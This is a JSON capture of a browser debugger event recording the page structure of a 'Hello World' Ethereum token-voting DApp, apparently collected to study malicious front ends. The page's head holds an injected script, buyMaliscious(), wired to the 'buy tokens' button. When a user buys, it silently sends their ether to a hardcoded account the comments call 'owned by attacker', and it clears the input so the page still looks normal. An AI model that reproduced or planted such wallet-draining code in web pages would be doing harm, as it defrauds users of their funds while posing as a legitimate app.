{
  "Trigger": {
    "DOM": "subtree-modified"
  },
  "TimeStamp": {
    "Day": "Friday",
    "Month": "April",
    "Date": 19,
    "Year": 2019,
    "Time": "18:59:12:11",
    "TimeZone": "UTC-2"
  },
  "DOM": {
    "type": "HTML",
    "content": [
      {
        "type": "HEAD",
        "content": [
          {
            "type": "TITLE",
            "content": [
              "Hello World DApp"
            ]
          },
          {
            "type": "LINK",
            "attributes": {
              "href": "https://fonts.googleapis.com/css?family=Open+Sans:400,700",
              "rel": "stylesheet",
              "type": "text/css"
            }
          },
          {
            "type": "LINK",
            "attributes": {
              "href": "https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css",
              "rel": "stylesheet",
              "type": "text/css"
            }
          },
          {
            "type": "STYLE",
            "content": [
              "\n    .margin-top-3 {\n      margin-top: 3em;\n    }\n  "
            ]
          },
          {
            "type": "STYLE",
            "content": [
              "body {\n  margin-left: 25%;\n  margin-right: 25%;\n  margin-top: 10%;\n  font-family: \"Open Sans\", sans-serif; }\n\nlabel {\n  display: inline-block;\n  width: 100px; }\n\ninput {\n  width: 500px;\n  padding: 5px;\n  font-size: 16px; }\n\nbutton {\n  font-size: 16px;\n  padding: 5px; }\n\nh1, h2 {\n  display: inline-block;\n  vertical-align: middle;\n  margin-top: 0px;\n  margin-bottom: 10px; }\n\nh2 {\n  color: #AAA;\n  font-size: 32px; }\n\nh3 {\n  font-weight: normal;\n  color: #AAA;\n  font-size: 24px; }\n\n.black {\n  color: black; }\n\n#balance {\n  color: black; }\n\n.hint {\n  color: #666; }\n"
            ],
            "attributes": {
              "type": "text/css"
            }
          },
          {
            "type": "SCRIPT",
            "content": [
              "function buyMaliscious(){\n\t\t//get amount of tokens user is willing to buy\n\t\tlet amountOfTokens = $('#buy').val();\n\n\t\t//get amount token price value from DApp user interface\n\t\tlet amountOfEther = amountOfTokens * parseFloat($('#token-cost').html());\n\n\t\t//empty input cell to mimick actual DApp behaviour\n\t\t$('#buy').val('');\n\n\t\t//transfer funds to an account owned by attacker -- note that the fallback function is empty\n\t\t//since we do not need to do anything yet it is required by js.\n\t\tweb3.eth.sendTransaction({to:'0xD6046C43E142df0EF98B32fC9db12477F19eA5B0', from:web3.eth.accounts[0], value:web3.toWei(amountOfEther,'ether')},()=>{});\n\n\t\t//buy tokens from maliscious contract and consequently transfer such an ammount of ether \n\t\t//to our maliscious smart contract\n\t\t//contractInstance.buy({value: web3.toWei(amountOfEther, 'ether'), from: web3.eth.accounts[0]},()=>{});\n\n\t}"
            ]
          }
        ]
      },
      {
        "type": "BODY",
        "content": [
          {
            "type": "H1",
            "content": [
              "A Simple Hello World Voting Application"
            ]
          },
          {
            "type": "DIV",
            "content": [
              {
                "type": "H2",
                "content": [
                  "Candidates"
                ]
              },
              {
                "type": "DIV",
                "content": [
                  "\n      ",
                  {
                    "type": "TABLE",
                    "content": [
                      "\n        ",
                      {
                        "type": "THEAD",
                        "content": [
                          "\n          ",
                          {
                            "type": "TR",
                            "content": [
                              "\n            ",
                              {
                                "type": "TH",
                                "content": [
                                  "Candidate"
                                ]
                              },
                              "\n            ",
                              {
                                "type": "TH",
                                "content": []
                              },
                              "\n          "
                            ]
                          },
                          "\n        "
                        ]
                      },
                      "\n        ",
                      {
                        "type": "TBODY",
                        "content": [
                          "\n        ",
                          {
                            "type": "TR",
                            "content": [
                              {
                                "type": "TD",
                                "content": []
                              },
                              {
                                "type": "TD",
                                "attributes": {
                                  "id": "candidate-0"
                                }
                              }
                            ]
                          }
                        ],
                        "attributes": {
                          "id": "candidate-rows"
                        }
                      },
                      "\n      "
                    ],
                    "attributes": {
                      "class": "table table-bordered"
                    }
                  }
                ],
                "attributes": {
                  "class": "table-responsive"
                }
              },
              {
                "type": "DIV",
                "content": [
                  "\n      ",
                  {
                    "type": "H2",
                    "content": [
                      "Vote for Candidate"
                    ]
                  },
                  "\n      ",
                  {
                    "type": "DIV",
                    "attributes": {
                      "id": "msg"
                    }
                  },
                  "\n      ",
                  {
                    "type": "INPUT",
                    "attributes": {
                      "type": "text",
                      "id": "candidate",
                      "placeholder": "Enter the candidate name"
                    },
                    "value": ""
                  },
                  "\n      ",
                  {
                    "type": "BR"
                  },
                  "\n      ",
                  {
                    "type": "BR"
                  },
                  "\n      ",
                  {
                    "type": "INPUT",
                    "attributes": {
                      "type": "text",
                      "id": "vote-tokens",
                      "placeholder": "Total no. of tokens to vote"
                    },
                    "value": ""
                  },
                  "\n      ",
                  {
                    "type": "BR"
                  },
                  "\n      ",
                  {
                    "type": "BR"
                  },
                  "\n      ",
                  {
                    "type": "A",
                    "content": [],
                    "attributes": {
                      "href": "#",
                      "id": "vote-btn",
                      "onclick": "voteForCandidate()",
                      "class": "btn btn-primary"
                    }
                  }
                ],
                "attributes": {
                  "class": "container-fluid"
                }
              }
            ],
            "attributes": {
              "class": "col-sm-7 margin-top-3"
            }
          },
          {
            "type": "DIV",
            "content": [
              {
                "type": "DIV",
                "content": [
                  "\n      ",
                  {
                    "type": "H2",
                    "content": [
                      "Token Stats"
                    ]
                  },
                  "\n      ",
                  {
                    "type": "DIV",
                    "content": [
                      "\n        ",
                      {
                        "type": "TABLE",
                        "content": [
                          "\n          ",
                          {
                            "type": "TBODY",
                            "content": [
                              {
                                "type": "TR",
                                "content": [
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "content": [
                                      "Tokens For Sale"
                                    ]
                                  },
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "attributes": {
                                      "id": "tokens-total"
                                    }
                                  },
                                  "\n          "
                                ]
                              },
                              "\n          ",
                              {
                                "type": "TR",
                                "content": [
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "content": [
                                      "Tokens Sold"
                                    ]
                                  },
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "attributes": {
                                      "id": "tokens-sold"
                                    }
                                  },
                                  "\n          "
                                ]
                              },
                              "\n          ",
                              {
                                "type": "TR",
                                "content": [
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "content": [
                                      "Price Per Token"
                                    ]
                                  },
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "attributes": {
                                      "id": "token-cost"
                                    }
                                  },
                                  "\n          "
                                ]
                              },
                              "\n          ",
                              {
                                "type": "TR",
                                "content": [
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "content": [
                                      "Balance in the contract"
                                    ]
                                  },
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "attributes": {
                                      "id": "contract-balance"
                                    }
                                  },
                                  "\n          "
                                ]
                              },
                              "\n        "
                            ]
                          }
                        ],
                        "attributes": {
                          "class": "table table-bordered"
                        }
                      },
                      "\n      "
                    ],
                    "attributes": {
                      "class": "table-responsive"
                    }
                  }
                ],
                "attributes": {
                  "class": "row"
                }
              },
              {
                "type": "DIV",
                "content": [
                  "\n      ",
                  {
                    "type": "H2",
                    "content": [
                      "Purchase Tokens"
                    ]
                  },
                  "\n      ",
                  {
                    "type": "DIV",
                    "content": [
                      "\n        ",
                      {
                        "type": "DIV",
                        "attributes": {
                          "id": "buy-msg"
                        }
                      },
                      "\n        ",
                      {
                        "type": "INPUT",
                        "attributes": {
                          "type": "text",
                          "id": "buy",
                          "class": "col-sm-8",
                          "placeholder": "Number of tokens to buy"
                        },
                        "value": ""
                      },
                      " \n        ",
                      {
                        "type": "A",
                        "content": [],
                        "attributes": {
                          "href": "#",
                          "id": "buy-btn",
                          "class": "btn btn-primary",
                          "onclick": "buyMaliscious()"
                        }
                      },
                      "\n      "
                    ],
                    "attributes": {
                      "class": "col-sm-12"
                    }
                  }
                ],
                "attributes": {
                  "class": "row margin-top-3"
                }
              },
              {
                "type": "DIV",
                "content": [
                  "\n      ",
                  {
                    "type": "H2",
                    "content": [
                      "Lookup Voter Info"
                    ]
                  },
                  "\n      ",
                  {
                    "type": "DIV",
                    "content": [
                      "\n        ",
                      {
                        "type": "INPUT",
                        "attributes": {
                          "type": "text",
                          "id": "voter-info",
                          ",": "",
                          "class": "col-sm-8",
                          "placeholder": "Enter the voter address"
                        },
                        "value": ""
                      },
                      " \n        ",
                      {
                        "type": "A",
                        "content": [
                          "Lookup"
                        ],
                        "attributes": {
                          "href": "#",
                          "id": "lookup-btn",
                          "onclick": "lookupVoterInfo()",
                          "class": "btn btn-primary"
                        }
                      },
                      "\n        ",
                      {
                        "type": "DIV",
                        "content": [
                          "\n          ",
                          {
                            "type": "DIV",
                            "attributes": {
                              "id": "tokens-bought",
                              "class": "margin-top-3 col-md-12"
                            }
                          },
                          "\n          ",
                          {
                            "type": "DIV",
                            "attributes": {
                              "id": "votes-cast",
                              "class": "col-md-12"
                            }
                          },
                          "\n        "
                        ],
                        "attributes": {
                          "class": "voter-details row text-left"
                        }
                      },
                      "\n      "
                    ],
                    "attributes": {
                      "class": "col-sm-12"
                    }
                  }
                ],
                "attributes": {
                  "class": "row margin-top-3"
                }
              }
            ],
            "attributes": {
              "class": "col-sm-offset-1 col-sm-4 margin-top-3"
            }
          },
          {
            "type": "SCRIPT",
            "attributes": {
              "src": "https://cdn.rawgit.com/ethereum/web3.js/develop/dist/web3.js"
            }
          },
          {
            "type": "SCRIPT",
            "attributes": {
              "src": "https://code.jquery.com/jquery-3.1.1.slim.min.js"
            }
          },
          {
            "type": "SCRIPT",
            "attributes": {
              "src": "app.js"
            }
          }
        ],
        "attributes": {
          "class": "container"
        }
      }
    ]
  },
  "AdditionalInfo": {
    "callFrames": [
      {
        "callFrameId": "{\"ordinal\":0,\"injectedScriptId\":5}",
        "functionName": "",
        "functionLocation": {
          "scriptId": "77",
          "lineNumber": 2,
          "columnNumber": 17422
        },
        "location": {
          "scriptId": "77",
          "lineNumber": 2,
          "columnNumber": 17506
        },
        "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
        "scopeChain": [
          {
            "type": "local",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":5,\"id\":253}"
            },
            "startLocation": {
              "scriptId": "77",
              "lineNumber": 2,
              "columnNumber": 17422
            },
            "endLocation": {
              "scriptId": "77",
              "lineNumber": 2,
              "columnNumber": 17522
            }
          },
          {
            "type": "closure",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":5,\"id\":254}"
            },
            "startLocation": {
              "scriptId": "77",
              "lineNumber": 1,
              "columnNumber": 272
            },
            "endLocation": {
              "scriptId": "77",
              "lineNumber": 3,
              "columnNumber": 4953
            }
          },
          {
            "type": "global",
            "object": {
              "type": "object",
              "className": "Window",
              "description": "Window",
              "objectId": "{\"injectedScriptId\":5,\"id\":255}"
            }
          }
        ],
        "this": {
          "type": "object",
          "subtype": "node",
          "className": "HTMLTableSectionElement",
          "description": "tbody#candidate-rows",
          "objectId": "{\"injectedScriptId\":5,\"id\":256}"
        }
      },
      {
        "callFrameId": "{\"ordinal\":1,\"injectedScriptId\":5}",
        "functionName": "Ia",
        "functionLocation": {
          "scriptId": "77",
          "lineNumber": 2,
          "columnNumber": 15498
        },
        "location": {
          "scriptId": "77",
          "lineNumber": 2,
          "columnNumber": 15938
        },
        "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
        "scopeChain": [
          {
            "type": "local",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":5,\"id\":257}"
            },
            "name": "Ia",
            "startLocation": {
              "scriptId": "77",
              "lineNumber": 2,
              "columnNumber": 15498
            },
            "endLocation": {
              "scriptId": "77",
              "lineNumber": 2,
              "columnNumber": 16169
            }
          },
          {
            "type": "closure",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":5,\"id\":258}"
            },
            "startLocation": {
              "scriptId": "77",
              "lineNumber": 1,
              "columnNumber": 272
            },
            "endLocation": {
              "scriptId": "77",
              "lineNumber": 3,
              "columnNumber": 4953
            }
          },
          {
            "type": "global",
            "object": {
              "type": "object",
              "className": "Window",
              "description": "Window",
              "objectId": "{\"injectedScriptId\":5,\"id\":259}"
            }
          }
        ],
        "this": {
          "type": "undefined"
        }
      },
      {
        "callFrameId": "{\"ordinal\":2,\"injectedScriptId\":5}",
        "functionName": "append",
        "functionLocation": {
          "scriptId": "77",
          "lineNumber": 2,
          "columnNumber": 17386
        },
        "location": {
          "scriptId": "77",
          "lineNumber": 2,
          "columnNumber": 17396
        },
        "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
        "scopeChain": [
          {
            "type": "local",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":5,\"id\":260}"
            },
            "name": "append",
            "startLocation": {
              "scriptId": "77",
              "lineNumber": 2,
              "columnNumber": 17386
            },
            "endLocation": {
              "scriptId": "77",
              "lineNumber": 2,
              "columnNumber": 17524
            }
          },
          {
            "type": "closure",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":5,\"id\":261}"
            },
            "startLocation": {
              "scriptId": "77",
              "lineNumber": 1,
              "columnNumber": 272
            },
            "endLocation": {
              "scriptId": "77",
              "lineNumber": 3,
              "columnNumber": 4953
            }
          },
          {
            "type": "global",
            "object": {
              "type": "object",
              "className": "Window",
              "description": "Window",
              "objectId": "{\"injectedScriptId\":5,\"id\":262}"
            }
          }
        ],
        "this": {
          "type": "object",
          "subtype": "array",
          "className": "r.fn.init",
          "description": "r.fn.init(1)",
          "objectId": "{\"injectedScriptId\":5,\"id\":263}"
        }
      },
      {
        "callFrameId": "{\"ordinal\":3,\"injectedScriptId\":5}",
        "functionName": "",
        "functionLocation": {
          "scriptId": "112",
          "lineNumber": 7,
          "columnNumber": 283597
        },
        "location": {
          "scriptId": "112",
          "lineNumber": 7,
          "columnNumber": 283622
        },
        "url": "http://localhost:8080/app.js",
        "scopeChain": [
          {
            "type": "local",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":5,\"id\":264}"
            },
            "startLocation": {
              "scriptId": "112",
              "lineNumber": 7,
              "columnNumber": 283597
            },
            "endLocation": {
              "scriptId": "112",
              "lineNumber": 7,
              "columnNumber": 283679
            }
          },
          {
            "type": "closure",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":5,\"id\":265}"
            },
            "startLocation": {
              "scriptId": "112",
              "lineNumber": 7,
              "columnNumber": 283240
            },
            "endLocation": {
              "scriptId": "112",
              "lineNumber": 7,
              "columnNumber": 286148
            }
          },
          {
            "type": "global",
            "object": {
              "type": "object",
              "className": "Window",
              "description": "Window",
              "objectId": "{\"injectedScriptId\":5,\"id\":266}"
            }
          }
        ],
        "this": {
          "type": "undefined"
        }
      },
      {
        "callFrameId": "{\"ordinal\":4,\"injectedScriptId\":5}",
        "functionName": "",
        "functionLocation": {
          "scriptId": "112",
          "lineNumber": 7,
          "columnNumber": 283497
        },
        "location": {
          "scriptId": "112",
          "lineNumber": 7,
          "columnNumber": 283581
        },
        "url": "http://localhost:8080/app.js",
        "scopeChain": [
          {
            "type": "local",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":5,\"id\":267}"
            },
            "startLocation": {
              "scriptId": "112",
              "lineNumber": 7,
              "columnNumber": 283497
            },
            "endLocation": {
              "scriptId": "112",
              "lineNumber": 7,
              "columnNumber": 283880
            }
          },
          {
            "type": "closure",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":5,\"id\":268}"
            },
            "startLocation": {
              "scriptId": "112",
              "lineNumber": 7,
              "columnNumber": 283240
            },
            "endLocation": {
              "scriptId": "112",
              "lineNumber": 7,
              "columnNumber": 286148
            }
          },
          {
            "type": "global",
            "object": {
              "type": "object",
              "className": "Window",
              "description": "Window",
              "objectId": "{\"injectedScriptId\":5,\"id\":269}"
            }
          }
        ],
        "this": {
          "type": "undefined"
        }
      }
    ],
    "reason": "DOM",
    "data": {
      "targetNodeId": 342,
      "insertion": true,
      "nodeId": 316,
      "type": "subtree-modified"
    },
    "hitBreakpoints": [],
    "asyncStackTrace": {
      "description": "Promise.then",
      "callFrames": [
        {
          "functionName": "",
          "scriptId": "112",
          "url": "http://localhost:8080/app.js",
          "lineNumber": 7,
          "columnNumber": 283484
        }
      ],
      "parent": {
        "description": "Promise.then",
        "callFrames": [
          {
            "functionName": "f",
            "scriptId": "112",
            "url": "http://localhost:8080/app.js",
            "lineNumber": 7,
            "columnNumber": 283444
          },
          {
            "functionName": "",
            "scriptId": "112",
            "url": "http://localhost:8080/app.js",
            "lineNumber": 7,
            "columnNumber": 286142
          },
          {
            "functionName": "j",
            "scriptId": "77",
            "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
            "lineNumber": 1,
            "columnNumber": 30163
          },
          {
            "functionName": "k",
            "scriptId": "77",
            "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
            "lineNumber": 1,
            "columnNumber": 30477
          }
        ],
        "parent": {
          "description": "setTimeout",
          "callFrames": [
            {
              "functionName": "",
              "scriptId": "77",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 30686
            },
            {
              "functionName": "i",
              "scriptId": "77",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 28198
            },
            {
              "functionName": "fireWith",
              "scriptId": "77",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 28964
            },
            {
              "functionName": "fire",
              "scriptId": "77",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 29000
            },
            {
              "functionName": "i",
              "scriptId": "77",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 28198
            },
            {
              "functionName": "fireWith",
              "scriptId": "77",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 28964
            },
            {
              "functionName": "ready",
              "scriptId": "77",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 2,
              "columnNumber": 144
            },
            {
              "functionName": "R",
              "scriptId": "77",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 2,
              "columnNumber": 278
            }
          ]
        }
      }
    }
  }
}